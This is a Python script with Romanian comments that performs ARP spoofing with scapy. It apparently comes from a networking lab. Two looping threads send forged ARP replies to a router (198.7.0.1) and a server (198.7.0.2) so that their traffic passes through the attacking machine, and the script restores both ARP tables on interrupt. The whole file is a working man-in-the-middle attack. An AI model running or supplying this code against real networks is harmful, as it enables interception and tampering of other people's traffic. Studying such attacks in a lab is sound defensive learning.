#inspiratie:
#https://github.com/davidlares/arp-spoofing
#https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
#https://thepythoncode.com/article/building-arp-spoofer-using-scapy

import scapy.all as scapy
import threading
import time

def get_mac(ip):
    """
    Functie care preia adresa MAC de la o adresa IP data
    Trimite ARP request la target IP si preia raspunsurile ca sa extraga adresa MAC.
    """
    # cream un request ARP pentru IP ul target
    request = scapy.ARP(pdst=ip)
    # cream un Ethernet frame cu destinatie broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combinam pachetele
    final_packet = broadcast / request
    # trimitem pachetul si primim raspunsul
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    # extragem adresa MAC din raspuns
    mac = answer[0][1].hwsrc
    return mac

def spoof(target_ip, spoof_ip):
    """
    Functie care trimite un raspuns spoofed
    Pacaleste victima sa creada ca spoof_ip e adresa MAC a middle
    """
    # preluam adresa MAC a tintei
    target_mac = get_mac(target_ip)
    # cream un pachet ARP 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the packet
    scapy.send(packet, verbose=False)
    print(f"[INFO] Sent spoofed ARP packet: {spoof_ip} is-at {target_mac} to {target_ip}")

def restore(target_ip, source_ip):
    # luam adresele MAC reale
    target_mac = get_mac(target_ip) 
    source_mac = get_mac(source_ip)
    # cream pachet cu adresele MAC corecte
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # trimitem pachetul de mai multe ori ca sa fim siguri ca tabelul ARP e actualizat
    scapy.send(packet, count=5, verbose=False)
    print(f"[INFO] Restored ARP table for {target_ip}, {source_ip} is-at {source_mac}")

def spoof_router():
    while True:
        spoof("198.7.0.1", "198.7.0.2")  #ruterul crede ca middle e serverul
        time.sleep(5) 

def spoof_server():
    while True:
        spoof("198.7.0.2", "198.7.0.1")  #serverul crede ca middle e ruterul
        time.sleep(5)

def main():
    try:
        thread_router = threading.Thread(target=spoof_router)
        thread_server = threading.Thread(target=spoof_server)
        
        thread_router.start()
        thread_server.start()

        thread_router.join()
        thread_server.join()
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring ARP tables...")
        restore("198.7.0.1", "198.7.0.2")
        restore("198.7.0.2", "198.7.0.1")

if __name__ == "__main__":
    main()

